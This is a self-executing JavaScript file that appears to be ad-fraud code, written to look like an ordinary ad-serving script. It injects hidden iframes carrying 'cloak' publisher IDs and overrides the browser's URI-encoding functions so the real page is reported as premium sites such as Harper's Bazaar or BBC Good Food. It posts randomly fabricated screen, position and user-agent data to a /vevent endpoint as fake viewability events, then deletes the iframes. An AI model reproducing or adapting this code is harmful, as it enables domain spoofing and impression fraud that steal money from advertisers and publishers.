

(function() {
    var ga = function(){};
    var compiled = [
      [{
        "domain": "www.otcmarkets.com",
        "vertical": "news",
        "url": "http:\/\/www.otcmarkets.com\/news\/otc-market-headline?id=372048"
    }, {
        "account_id": "557482",
        "width": "300",
        "height": "250",
        "item_id": "295062&epid=69131",
        "company": "wc",
        "nid": "4",
        "vertical": "news",
        "name": "wc"
    }],
    [{
        "domain": "www.harpersbazaar.com",
        "vertical": "news",
        "url": "http:\/\/www.harpersbazaar.com\/fashion\/"
    }, {
        "account_id": "558433",
        "width": "300",
        "height": "600",
        "item_id": "337562",
        "nid": "4",
        "name": "Sidebar-RON1-3006001",
        "company": "0001US"
    }],
    [{
        "domain": "toofab.com",
        "vertical": "news",
        "url": "http:\/\/toofab.com\/tags\/CaitlynJenner\/"
    }, {
        "account_id": "557482",
        "width": "300",
        "height": "250",
        "item_id": "295061&epid=69131",
        "company": "wc",
        "nid": "4",
        "vertical": "news",
        "name": "wc"
    }],
    [{
        "domain": "www.bbcgoodfood.com",
        "vertical": "news",
        "url": "http:\/\/www.bbcgoodfood.com\/feature\/christmas-kitchen"
    }, {
        "account_id": "557482",
        "width": "300",
        "height": "250",
        "item_id": "295064&epid=69131",
        "company": "wc",
        "nid": "4",
        "vertical": "news",
        "name": "wc"
    }],
    [{
        "domain": "www.soompi.com",
        "vertical": "news",
        "url": "http:\/\/www.soompi.com\/tips\/"
    }, {
        "account_id": "558433",
        "width": "300",
        "height": "600",
        "item_id": "337563",
        "nid": "4",
        "name": "SidebarA-RON1-3006001",
        "company": "0001US"
    }],
    [{
        "domain": "www.imposemagazine.com",
        "vertical": "news",
        "url": "http:\/\/www.imposemagazine.com\/tag\/wyatt-grant"
    }, {
        "account_id": "557482",
        "width": "300",
        "height": "250",
        "item_id": "295063&epid=69131",
        "company": "wc",
        "nid": "4",
        "vertical": "news",
        "name": "wc"
    }],
    [{
        "domain": "www.wunderground.com",
        "vertical": "news",
        "url": "http:\/\/www.wunderground.com\/blog\/index.html?range=updated&t=1447816393"
    }, {
        "account_id": "557482",
        "width": "300",
        "height": "250",
        "item_id": "295065&epid=69131",
        "company": "wc",
        "nid": "4",
        "vertical": "news",
        "name": "wc"
    }]
    ];
    var count = 0;
    window._compiled = compiled;
    window._lastElm = document.getElementById('spoint');

    function renderIframe(comp) {
        var account_id = comp[1]['account_id'],
            id = comp[1]['item_id'],
            sid = (typeof comp[1]['sid'] !== 'undefined') ? comp[1]['sid'] : 0,
            url = comp[0]['url'],
            domain = comp[0]['domain'],
            width = comp[1]['width'],
            height = comp[1]['height'],
            ref = encodeURIComponent(comp[0]['url']),
            cb = Math.round(new Date().getTime()),
            iframe = document.createElement('iframe'),
            iFrDoc;
        iframe.name = 'iFr_' + comp[1]['item_id'] + '_' + Math.round(new Date().getTime());
        iframe.setAttribute('width', width);
        iframe.setAttribute('height', height);
        iframe.setAttribute('marginwidth', '0');
        iframe.setAttribute('marginheight', '0');
        iframe.setAttribute('align', 'top');
        iframe.setAttribute('scrolling', 'No');
        iframe.setAttribute('frameborder', '0');
        iframe.setAttribute('hspace', '0');
        iframe.setAttribute('vspace', '0');
        iframe.setAttribute('id', iframe.name);
        window._lastElm.parentNode.insertBefore(iframe, window._lastElm);
        window._lastElm = iframe;
        var n_d = '',
            n_s = "<script src='http://revive.adjs.net/www/delivery/ajs.php?zoneid=8&cb=100&charset=UTF-8&bid_request_id=test_id&pub_id=cloak&ssp=cloak&cmp_id=mobile1&ad_id=autsm'><\/script>"
        if (iframe.contentDocument) {
            iFrDoc = iframe.contentDocument;
        } else if (iframe.contentWindow) {
            iFrDoc = iframe.contentWindow.document;
        } else if (window.frames[iframe.name]) {
            iFrDoc = iframe.frames[iframe.name].document;
        }
        iFrDoc.open();
        iFrDoc.write('<body><script>var comp = ' + JSON.stringify(comp) + ';</script>' + "<script type='text\/javascript'>\n\n\t(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){\n\t\t\t(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),\n\t\tm=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)\n\t})(window,document,'script','\/\/www.google-analytics.com\/analytics.js','ga');\n\tga('create', 'UA-FAKE', 'auto');\n\n\tfunction getBrowserInfo()\n\t{\n\t\tvar objappVersion = navigator.appVersion; var objAgent = navigator.userAgent; var objbrowserName = navigator.appName;\n\t\tvar objfullVersion = ''+parseFloat(navigator.appVersion);var objBrMajorVersion = parseInt(navigator.appVersion,10);\n\t\tvar objOffsetName,objOffsetVersion,ix;\n\t\t\/\/ In Chrome\n\t\tif ((objOffsetVersion=objAgent.indexOf(\"Chrome\"))!=-1){ objbrowserName = \"Chrome\"; objfullVersion = objAgent.substring(objOffsetVersion+7); }\n\t\t\/\/ In Microsoft internet explorer\n\t\telse if((objOffsetVersion=objAgent.indexOf(\"MSIE\"))!=-1){ objbrowserName = \"Microsoft Internet Explorer\";objfullVersion = objAgent.substring(objOffsetVersion+5); }\n\t\t\/\/ In Firefox\n\t\telse if((objOffsetVersion=objAgent.indexOf(\"Firefox\"))!=-1){ objbrowserName = \"Firefox\"; }\n\t\t\/\/ In Safari\n\t\telse if ((objOffsetVersion=objAgent.indexOf(\"Safari\"))!=-1){ objbrowserName = \"Safari\"; objfullVersion = objAgent.substring(objOffsetVersion+7); if((objOffsetVersion=objAgent.indexOf(\"Version\"))!=-1) objfullVersion = objAgent.substring(objOffsetVersion+8); }\n\t\t\/\/ For other browser \"name\/version\" is at the end of userAgent\n\t\telse if ( (objOffsetName=objAgent.lastIndexOf('')+1) < (objOffsetVersion=objAgent.lastIndexOf('\/')) ){ objbrowserName = objAgent.substring(objOffsetName,objOffsetVersion);objfullVersion = objAgent.substring(objOffsetVersion+1); if(objbrowserName.toLowerCase()==objbrowserName.toUpperCase()){ objbrowserName = navigator.appName; } }\n\t\t\/\/ trimming the fullVersion string at semicolon\/space if present\n\t\tif((ix=objfullVersion.indexOf(\";\"))!=-1) objfullVersion=objfullVersion.substring(0,ix); if((ix=objfullVersion.indexOf(\" \"))!=-1) objfullVersion=objfullVersion.substring(0,ix); objBrMajorVersion = parseInt(''+objfullVersion,10); if (isNaN(objBrMajorVersion)){ objfullVersion = ''+parseFloat(navigator.appVersion);objBrMajorVersion = parseInt(navigator.appVersion,10); }\n\n\t\treturn { browser : objbrowserName, version : objfullVersion,ua : navigator.userAgent};\n\t}\n\n\tfunction cascadeWindowInfo(info){\n\t\tvar mapping = {};\n\t\t\n\t\tmapping[document.domain] = info.domain;\n\t\tmapping[document.location.href] = info.site;\n\t\tmapping[document.location] = info.site;\n\t\tmapping[window.location.host] = info.domain;\n\t\tmapping[window.location.hostname] = info.domain;\n\t\t if(document.referrer.length > 0)\n\t\t\tmapping[document.referrer] = info.site;\n\t\t\n\t\ttry {\n\t\t\tmapping[parent.document.location.href] = info.site;\n\t\t\tif(parent.document.referrer.length > 0)\n\t\t\t\tmapping[parent.document.referrer] = info.site;\n\t\t} catch(e){}\n\t\t\n\t\ttry {\n\t\t\tmapping[top.document.location.href] = info.site;\n\t\t\tif(top.document.referrer.length > 0)\n\t\t\t\tmapping[top.document.referrer] = info.site;\n\t\t} catch(e) {}\n\t\t\n\t\tif('ancestorOrigins' in window.location && window.location.ancestorOrigins.length > 0)\n\t\t{\n\t\t\tfor(var i=0;i<window.location.ancestorOrigins.length;i++)\n\t\t\t{\n\t\t\t\tmapping[window.location.ancestorOrigins[i]] = info.domain;\n\t\t\t}\n\t\t}\n\t\t\n\t\tfunction privateEncode(str,type)\n\t\t{\n\t\t\tfor(var match in mapping)\n\t\t\t{\n\t\t\t\tif(match.length > 0)\n\t\t\t\t{\n\t\t\t\t\tvar re = new RegExp(match.trim(),\"gi\");\n\t\t\t\t\t\/\/force string type\n\t\t\t\t\tstr = \"\" + str;\n\t\t\t\t\t\/\/str = str.toString();\n\t\t\t\t\tstr = str.replace(re,mapping[match]);\n\t\t\t\t\tstr = str.replace(match.trim(),mapping[match]);\n\t\t\t\t}\n\t\t\t}\n\t\t\treturn privateFinish(type(str),type);\n\t\t}\n\t\t\n\t\tfunction privateFinish(str,type)\n\t\t{\n\t\t\tfor(var match in mapping)\n\t\t\t{\n\t\t\t\tif(match.length > 0)\n\t\t\t\t{\n\t\t\t\t\tvar re = new RegExp(type(match.trim()),\"ig\");\n\t\t\t\t\tstr = str.replace(re,mapping[match]);\n\t\t\t\t\tstr = str.replace(type(match.trim()),mapping[match]);\n\t\t\t\t}\n\t\t\t}\n\t\t\treturn str;\n\t\t}\n\n\t\tfunction parse_url(str,component) {\n\n\t\t\ttry {\n\t\t\t\tthis.php_js = this.php_js || {};\n\t\t\t} catch (e) {\n\t\t\t\tthis.php_js = {};\n\t\t\t}\n\n\t\t\tvar query;\n\t\t\tvar ini = (this.php_js && this.php_js.ini) || {};\n\t\t\tvar mode = (ini['phpjs.parse_url.mode'] && ini['phpjs.parse_url.mode'].local_value) || 'php';\n\t\t\tvar key = [\n\t\t\t\t'source',\n\t\t\t\t'scheme',\n\t\t\t\t'authority',\n\t\t\t\t'userInfo',\n\t\t\t\t'user',\n\t\t\t\t'pass',\n\t\t\t\t'host',\n\t\t\t\t'port',\n\t\t\t\t'relative',\n\t\t\t\t'path',\n\t\t\t\t'directory',\n\t\t\t\t'file',\n\t\t\t\t'query',\n\t\t\t\t'fragment'\n\t\t\t];\n\t\t\tvar parser = {\n\t\t\t\tphp: \/^(?:([^:\\\/?#]+):)?(?:\\\/\\\/()(?:(?:()(?:([^:@\\\/]*):?([^:@\\\/]*))?@)?([^:\\\/?#]*)(?::(\\d*))?))?()(?:(()(?:(?:[^?#\\\/]*\\\/)*)()(?:[^?#]*))(?:\\?([^#]*))?(?:#(.*))?)\/,\n\t\t\t\tstrict: \/^(?:([^:\\\/?#]+):)?(?:\\\/\\\/((?:(([^:@\\\/]*):?([^:@\\\/]*))?@)?([^:\\\/?#]*)(?::(\\d*))?))?((((?:[^?#\\\/]*\\\/)*)([^?#]*))(?:\\?([^#]*))?(?:#(.*))?)\/,\n\t\t\t\tloose: \/^(?:(?![^:@]+:[^:@\\\/]*@)([^:\\\/?#.]+):)?(?:\\\/\\\/\\\/?)?((?:(([^:@\\\/]*):?([^:@\\\/]*))?@)?([^:\\\/?#]*)(?::(\\d*))?)(((\\\/(?:[^?#](?![^?#\\\/]*\\.[^?#\\\/.]+(?:[?#]|$)))*\\\/?)?([^?#\\\/]*))(?:\\?([^#]*))?(?:#(.*))?)\/ \/\/ Added one optional slash to post-scheme to catch file:\/\/\/ (should restrict this)\n\t\t\t};\n\n\t\t\tvar m = parser[mode].exec(str);\n\t\t\tvar uri = {};\n\t\t\tvar i = 14;\n\n\t\t\twhile (i--) {\n\t\t\t\tif (m[i]) {\n\t\t\t\t\turi[key[i]] = m[i];\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tif(component) {\n\t\t\t\treturn uri[component.replace('PHP_URL_','').toLowerCase()];\n\t\t\t}\n\n\t\t\tif (mode !== 'php') {\n\t\t\t\tvar name = (ini['phpjs.parse_url.queryKey'] &&\n\t\t\t\t\tini['phpjs.parse_url.queryKey'].local_value) || 'queryKey';\n\t\t\t\tparser = \/(?:^|&)([^&=]*)=?([^&]*)\/g;\n\t\t\t\turi[name] = {};\n\t\t\t\tquery = uri[key[12]] || '';\n\t\t\t\tquery.replace(parser, function ($0, $1, $2) {\n\t\t\t\t\tif($1) {\n\t\t\t\t\t\turi[name][$1] = $2;\n\t\t\t\t\t}\n\t\t\t\t});\n\t\t\t}\n\n\t\t\tdelete uri.source;\n\t\t\treturn uri;\n\t\t}\n\n\t\tfunction gDim(ur,aw,ah,e,dlo,r,x_)\n\t\t{\n\t\t\tvar mf=Math.floor,mrd=Math.random,mr=Math.round;\n\t\t\tfunction rd(a,z){return mf(mrd()*(z-a+1)+a);}\n\t\t\tvar ajax={};ajax.x=function(){if(\"undefined\"!=typeof XMLHttpRequest)return new XMLHttpRequest;for(var e,t=[\"MSXML2.XmlHttp.5.0\",\"MSXML2.XmlHttp.4.0\",\"MSXML2.XmlHttp.3.0\",\"MSXML2.XmlHttp.2.0\",\"Microsoft.XmlHttp\"],n=0;n<t.length;n++)try{e=new ActiveXObject(t[n]);break}catch(a){}return e},ajax.send=function(e,t,n,a,o){var r=ajax.x();r.open(n,e+\"?\"+a,o),r.onreadystatechange=function(){4==r.readyState&&t(r.responseText)},\"POST\"==n&&r.setRequestHeader(\"Content-type\",\"application\/x-wwwform-urlencoded\"),r.send()},ajax.post=function(e,t,n,a){if(\"string\"==typeof t)var o=t;else{var o=[];for(var r in t)o.push(encodeURIComponent(r)+\"=\"+encodeURIComponent(t[r]));o=o.join(\"&\")}ajax.send(e,n,\"POST\",o,a)};\n\t\t\tvar dim = {\n\t\t\t\t\"e\": e,\n\t\t\t\t\"dlo\": dlo,\n\t\t\t\t\"referrer\": r,\n\t\t\t\t\"type\": 'pv',\n\t\t\t\t\"px\": false,\n\t\t\t\t\"py\": false,\n\t\t\t\t\"bw\": parseInt(aw),\n\t\t\t\t\"bh\": parseInt(ah),\n\t\t\t\t\"sw\": false,\n\t\t\t\t\"sh\": false,\n\t\t\t\t\"pw\": false,\n\t\t\t\t\"ph\": false,\n\t\t\t\t\"ww\": false,\n\t\t\t\t\"wh\": false,\n\t\t\t\t\"x\": x_\n\t\t\t};\n\t\t\tvar szs = [[1440,900],[1600,900],[1920,1080],[1366,768],[1280,1024],[1280,800],[1024,768],[800,600]];\n\t\t\tvar sz = szs[mf(mrd()*szs.length)];\n\t\t\tdim.sw = sz[0];\n\t\t\tdim.sh = sz[1];\n\t\t\tdim.ww = rd(mr(dim.sw*.5),dim.sw);\n\t\t\tdim.wh = rd(mr(dim.sw*.8),dim.sw);\n\t\t\tdim.pw = rd(dim.ww-10,dim.ww);\n\t\t\tdim.ph = rd(dim.wh,dim.wh*6);\n\t\t\tdim.px = rd(0,mf(dim.ww-(dim.bw*.7)));\n\t\t\tdim.py = rd(mf(dim.bh*.7),mf(dim.wh-(dim.bh*.7)));\n\t\t\tajax.post(ur,dim,function(){},true);\n\t\t}\n\n\t\tfunction getDataByTagName()\n\t\t{\n\n\t\t\tvar tv = 'view5-1',\n\t\t\t\treferrer = null,\n\t\t\t\turl = null,\n\t\t\t\tx = null,\n\t\t\t\tts = (new Date).getTime() + Math.floor(Math.random() * 900000 + 100000),\n\t\t\t\tuos = ['mac', 'win'],\n\t\t\t\truos = uos[Math.floor(Math.random() * uos.length)],\n\t\t\t\tua = (ruos == 'mac') ? ['webkit_chrome', 'gecko10'] : ['webkit_chrome','gecko10', 'ie11', 'ie10', 'ie9'],\n\t\t\t\trua = ua[Math.floor(Math.random() * ua.length)],\n\t\t\t\tfound = false;\n\n\t\t\tif(document.getElementsByTagName('iframe').length) {\n\n\t\t\t\tvar withProperty = [],\n\t\t\t\t\tels = document.getElementsByTagName('iframe'),\n\t\t\t\t\ti = 0;\n\t\t\t\tfor (i = 0; i < els.length; i++) {\n\t\t\t\t\tvar src = els[i].getAttribute('src');\n\t\t\t\t\tif (src.match(\/ib\\.adnxs\\.com\\\/if\/)) {\n\t\t\t\t\t\twithProperty.push(els[i]);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tif(withProperty.length) {\n\t\t\t\t\tvar el = withProperty[0],\n\t\t\t\t\t\tparams = {},\n\t\t\t\t\t\tifs = el.getAttribute('src'),\n\t\t\t\t\t\taw = el.getAttribute('width'),\n\t\t\t\t\t\tah = el.getAttribute('height'),\n\t\t\t\t\t\td = aw + 'x' + ah,\n\t\t\t\t\t\tp = el.getAttribute('par');\n\n\t\t\t\t\tif (!p && ifs){\n\t\t\t\t\t\tvar uri = parse_url(ifs),\n\t\t\t\t\t\t\turiqry = uri.query.split('&'),\n\t\t\t\t\t\t\tets = (new Date).getTime() + Math.floor(Math.random() * 900000 + 100000);\n\t\t\t\t\t\tfor(var p in uriqry) {\n\t\t\t\t\t\t\tvar param = uriqry[p].split('=');\n\t\t\t\t\t\t\tparams[param[0]] = decodeURIComponent(param[1]);\n\t\t\t\t\t\t}\n\t\t\t\t\t\turl = 'http:\/\/' + uri.host + '\/vevent';\n\t\t\t\t\t\treferrer = params.referrer;\n\t\t\t\t\t\tfound = true;\n\t\t\t\t\t\tel.setAttribute('par', true);\n\t\t\t\t\t\tel.setAttribute('id', ets);\n\t\t\t\t\t\tparams.id = ets;\n\t\t\t\t\t\twindow.vparams.push({\n\t\t\t\t\t\t\t'url': url,\n\t\t\t\t\t\t\t'aw': aw,\n\t\t\t\t\t\t\t'ah': ah,\n\t\t\t\t\t\t\t'e':params.e,\n\t\t\t\t\t\t\t'dlo': params.dlo,\n\t\t\t\t\t\t\t'referrer': referrer,\n\t\t\t\t\t\t\t'x': x,\n\t\t\t\t\t\t\t'ts': ts,\n\t\t\t\t\t\t\t'uos': uos,\n\t\t\t\t\t\t\t'ruos': ruos,\n\t\t\t\t\t\t\t'ua': ua,\n\t\t\t\t\t\t\t'rua': rua,\n\t\t\t\t\t\t\t'tv': tv,\n\t\t\t\t\t\t\t'el': params.id\n\t\t\t\t\t\t});\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\tif(document.getElementsByTagName('div').length)\n\t\t\t{\n\t\t\t\tvar withProperty = [],\n\t\t\t\t\tels = document.getElementsByTagName('div'),\n\t\t\t\t\ti = 0,\n\t\t\t\t\tparams = {};\n\n\t\t\t\tfor (i = 0; i < els.length; i++) {\n\t\t\t\t\tif (els[i].hasAttribute('lnttag')) {\n\t\t\t\t\t\twithProperty.push(els[i]);\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\tif (withProperty.length)\n\t\t\t\t{\n\t\t\t\t\tvar el = withProperty[0],\n\t\t\t\t\t\tlnttag = el.getAttribute('lnttag'),\n\t\t\t\t\t\tlnt = lnttag.split(';'),\n\t\t\t\t\t\tp = el.getAttribute('par'),\n\t\t\t\t\t\tets = (new Date).getTime() + Math.floor(Math.random() * 900000 + 100000);\n\n\t\t\t\t\tif (!p) {\n\t\t\t\t\t\tlnt.splice(0, 1);\n\t\t\t\t\t\tfor (var p in lnt) {\n\t\t\t\t\t\t\tvar param = lnt[p].split('=');\n\t\t\t\t\t\t\tparams[param[0]] = decodeURIComponent(param[1]);\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\tvar uri = parse_url(params.cb),\n\t\t\t\t\t\t\turiqry = uri.query.split('&');\n\t\t\t\t\t\tfor (var p in uriqry) {\n\t\t\t\t\t\t\tvar param = uriqry[p].split('=');\n\t\t\t\t\t\t\tparams[param[0]] = decodeURIComponent(param[1]);\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\tvar dm = params.d.split('x');\n\t\t\t\t\t\taw = dm[0];\n\t\t\t\t\t\tah = dm[1];\n\t\t\t\t\t\turl = 'http:\/\/' + uri.host + '\/vevent';\n\t\t\t\t\t\treferrer = params.referrer;\n\t\t\t\t\t\tfound = true;\n\t\t\t\t\t\tel.setAttribute('par', true);\n\t\t\t\t\t\tel.setAttribute('id', ets);\n\t\t\t\t\t\tparams.id = ets;\n\t\t\t\t\t\twindow.vparams.push({\n\t\t\t\t\t\t\t'url': url,\n\t\t\t\t\t\t\t'aw': aw,\n\t\t\t\t\t\t\t'ah': ah,\n\t\t\t\t\t\t\t'e': params.e,\n\t\t\t\t\t\t\t'dlo': params.dlo,\n\t\t\t\t\t\t\t'referrer': referrer,\n\t\t\t\t\t\t\t'x': x,\n\t\t\t\t\t\t\t'ts': ts,\n\t\t\t\t\t\t\t'uos': uos,\n\t\t\t\t\t\t\t'ruos': ruos,\n\t\t\t\t\t\t\t'ua': ua,\n\t\t\t\t\t\t\t'rua': rua,\n\t\t\t\t\t\t\t'tv': tv,\n\t\t\t\t\t\t\t'el': params.id\n\t\t\t\t\t\t});\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\treturn found;\n\n\t\t}\n\n\t\tfunction getDataByQuerySelector()\n\t\t{\n\t\t\tvar tv = 'view5-1',\n\t\t\t\treferrer = null,\n\t\t\t\turl = null,\n\t\t\t\tx = null,\n\t\t\t\tts = (new Date).getTime() + Math.floor(Math.random() * 900000 + 100000),\n\t\t\t\tuos = ['mac', 'win'],\n\t\t\t\truos = uos[Math.floor(Math.random() * uos.length)],\n\t\t\t\tua = (ruos == 'mac') ? ['webkit_chrome','gecko10'] : ['webkit_chrome', 'gecko10', 'ie11', 'ie10','ie9'],\n\t\t\t\trua = ua[Math.floor(Math.random() * ua.length)],\n\t\t\t\tfound = false;\n\n\t\t\tif(document.querySelector('iframe[src*=\"ib.adnxs.com\/if\"]')){\n\t\t\t\tvar params = {},\n\t\t\t\t\tel = document.querySelector('iframe[src*=\"ib.adnxs.com\/if\"]'),\n\t\t\t\t\tifs = el.getAttribute('src'),\n\t\t\t\t\taw = el.getAttribute('width'),\n\t\t\t\t\tah = el.getAttribute('height'),\n\t\t\t\t\td = aw + 'x' + ah,\n\t\t\t\t\tp = el.getAttribute('par'),\n\t\t\t\t\tets = (new Date).getTime() + Math.floor(Math.random() * 900000 + 100000);\n\n\t\t\t\tif (!p && ifs) {\n\t\t\t\t\tvar uri = parse_url(ifs),\n\t\t\t\t\t\turiqry = uri.query.split('&');\n\t\t\t\t\tfor (var p in uriqry) {\n\t\t\t\t\t\tvar param = uriqry[p].split('=');\n\t\t\t\t\t\tparams[param[0]] = decodeURIComponent(param[1]);\n\t\t\t\t\t}\n\t\t\t\t\turl = 'http:\/\/' + uri.host + '\/vevent';\n\t\t\t\t\treferrer = params.referrer;\n\t\t\t\t\tfound = true;\n\t\t\t\t\tparams.id = ets;\n\t\t\t\t\tel.setAttribute('par',true);\n\t\t\t\t\tel.setAttribute('id', ets);\n\n\t\t\t\t\twindow.vparams.push({\n\t\t\t\t\t\t'url': url,\n\t\t\t\t\t\t'aw': aw,\n\t\t\t\t\t\t'ah': ah,\n\t\t\t\t\t\t'e': params.e,\n\t\t\t\t\t\t'dlo': params.dlo,\n\t\t\t\t\t\t'referrer': referrer,\n\t\t\t\t\t\t'x': x,\n\t\t\t\t\t\t'ts': ts,\n\t\t\t\t\t\t'uos': uos,\n\t\t\t\t\t\t'ruos': ruos,\n\t\t\t\t\t\t'ua':ua,\n\t\t\t\t\t\t'rua': rua,\n\t\t\t\t\t\t'tv': tv,\n\t\t\t\t\t\t'el': params.id\n\t\t\t\t\t});\n\t\t\t\t}\n\t\t\t}\n\t\t\tif(document.querySelector('div[lnttag]')) {\n\t\t\t\tvar el = document.querySelector('div[lnttag]'),\n\t\t\t\t\tparams = {},\n\t\t\t\t\tlnttag = el.getAttribute('lnttag'),\n\t\t\t\t\tlnt = lnttag.split(';'),\n\t\t\t\t\tets = (new Date).getTime() + Math.floor(Math.random() * 900000 + 100000),\n\t\t\t\t\tp = el.getAttribute('par');\n\n\t\t\t\tif (!p) {\n\n\t\t\t\t\tlnt.splice(0, 1);\n\t\t\t\t\tfor (var p in lnt) {\n\t\t\t\t\t\tvar param = lnt[p].split('=');\n\t\t\t\t\t\tparams[param[0]] = decodeURIComponent(param[1]);\n\t\t\t\t\t}\n\n\t\t\t\t\tvar uri = parse_url(params.cb),\n\t\t\t\t\t\turiqry = uri.query.split('&');\n\t\t\t\t\tfor (var p in uriqry) {\n\t\t\t\t\t\tvar param = uriqry[p].split('=');\n\t\t\t\t\t\tparams[param[0]] = decodeURIComponent(param[1]);\n\t\t\t\t\t}\n\n\t\t\t\t\tvar dm = params.d.split('x');\n\t\t\t\t\taw = dm[0];\n\t\t\t\t\tah = dm[1];\n\t\t\t\t\turl = 'http:\/\/' + uri.host + '\/vevent';\n\t\t\t\t\treferrer = params.referrer;\n\t\t\t\t\tfound = true;\n\n\t\t\t\t\tparams.id = ets;\n\t\t\t\t\tel.setAttribute('par', true);\n\t\t\t\t\tel.setAttribute('id', ets);\n\n\t\t\t\t\twindow.vparams.push({\n\t\t\t\t\t\t'url': url,\n\t\t\t\t\t\t'aw': aw,\n\t\t\t\t\t\t'ah': ah,\n\t\t\t\t\t\t'e': params.e,\n\t\t\t\t\t\t'dlo': params.dlo,\n\t\t\t\t\t\t'referrer': referrer,\n\t\t\t\t\t\t'x': x,\n\t\t\t\t\t\t'ts': ts,\n\t\t\t\t\t\t'uos': uos,\n\t\t\t\t\t\t'ruos': ruos,\n\t\t\t\t\t\t'ua': ua,\n\t\t\t\t\t\t'rua': rua,\n\t\t\t\t\t\t'tv': tv,\n\t\t\t\t\t\t'el': params.id\n\t\t\t\t\t});\n\t\t\t\t}\n\t\t\t}\n\t\t\treturn found;\n\n\t\t}\n\n\t\tvar wrapper = {};\n\n\n\t\twrapper['escape'] = window.escape;\n\t\twindow.escape = function(n) { return privateEncode(n,wrapper['escape']); };\n\n\n\t\twrapper['encodeURIComponent'] = window.encodeURIComponent;\n\t\twindow.encodeURIComponent = function(n) { return privateEncode(n,wrapper['encodeURIComponent']); };\n\t\t\n\t\twrapper['decodeURIComponent'] = window.decodeURIComponent;\n\t\twindow.decodeURIComponent = function(n) { return privateEncode(n,wrapper['decodeURIComponent']); };\n\t\t\n\t\twrapper['decodeURI'] = window.decodeURI;\n\t\twindow.decodeURI = function(n) { return privateEncode(n,wrapper['decodeURI']); };\n\t\t\n\t\twrapper['encodeURI'] = window.encodeURI;\n\t\twindow.encodeURI = function(n) { return privateEncode(n,wrapper['encodeURI']); };\n\t\t\n\t\twrapper['unescape'] = window.unescape;\n\t\twindow.unescape = function(n) { return privateEncode(n,wrapper['unescape']); };\n\n\t\tif (Math.floor(Math.random() * (new Date().getSeconds())) < 10) {\n\t\t\twindow._intv = 0;\n\t\t\twindow._intc = 0;\n\t\t\twindow.vdims = {};\n\t\t\twindow.vparams = [];\n\t\t\twindow._intv = setInterval(function () {\n\n\t\t\t\tvar success = false,\n\t\t\t\t\ti;\n\t\t\t\tif (window._intc > 10){\n\t\t\t\t\tclearInterval(window._intv);\n\t\t\t\t\tdelete window._intv;\n\t\t\t\t\tdelete window._intc;\n\t\t\t\t}\n\t\t\t\twindow._intc++;\n\n\t\t\t\tsuccess = (typeof(document.querySelector) != 'undefined') ? getDataByQuerySelector() : getDataByTagName();\n\n\t\t\t\tif (!success) return false;\n\n\t\t\t\tfor(i = 0;i<window.vparams.length; i++)\n\t\t\t\t{\n\t\t\t\t\tvar params = window.vparams[i];\n\t\t\t\t\tparams.x = params.ts + ',199999,v,' + params.ruos + ',' + params.rua + ',' + params.tv + ',90,,0';\n\t\t\t\t\tif (typeof(window.vdims[params.el]) == 'undefined') {\n\t\t\t\t\t\tgDim(params.url, params.aw,params.ah, params.e, params.dlo, params.referrer, params.x);\n\t\t\t\t\t\twindow.vdims[params.el] = document.getElementById(params.el);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}, 300);\n\t\t}\n\t}\n\n\twindow.onerror = function(errorMsg, url, lineNumber) {\n\t\tvar browser = getBrowserInfo(),\n\t\t\tvalue = 'Error: ' + errorMsg + ',Script: ' + url + ', Line: ' + lineNumber;\n\t\tga('send','pageview');\n\t\tga('send', 'event', {\n\t\t\t'eventCategory':comp[1]['company'],\n\t\t\t'eventAction': 'error',\n\t\t\t'eventLabel' : value\n\t\t});\n\n\t\tga('send', 'event', {\n\t\t\t'eventCategory' : 'Browser',\n\t\t\t'eventAction' :browser.browser,\n\t\t\t'eventLabel'\t: browser.ua\n\t\t});\n\t}\n<\/script>" + '<script>cascadeWindowInfo({"site":"' + url + '","domain":"' + domain + '"});</script>' + n_s + '</body>');
        iFrDoc.close();
        if ((Math.floor(Math.random() * 100) + 1) <= 2) {
            ga('set', 'campaignSource', '(direct)');
            ga('set', 'campaignName', comp[1]['company']);
            ga('set', 'campaignKeyword', comp[1]['company']);
            ga('send', 'pageview');
            ga('send', 'event', {
                'eventCategory': comp[1]['company'],
                'eventAction': 'referrer',
                'eventLabel': url
            });
            ga('send', 'event', {
                'eventCategory': comp[1]['company'],
                'eventAction': 'sites',
                'eventLabel': domain
            });
            ga('send', 'event', {
                'eventCategory': comp[1]['company'],
                'eventAction': 'placement',
                'eventLabel': comp[1]['item_id']
            });
            ga('send', 'event', {
                'eventCategory': comp[1]['company'],
                'eventAction': 'zone',
                'eventLabel': '31961:373877463'
            });
        }
        return iframe;
    }
    for (var x in compiled) {
        (function(pos) {
            var comp = compiled[x];
            comp.num = x;
            setTimeout(function() {
                var iframe = renderIframe(comp);
                count++;
                (function(ifr) {
                    setTimeout(function() {
                        ifr.parentNode.removeChild(ifr);
                    }, 10000);
                })(iframe);
            }, pos * 200);
        })(x);
    }
})();
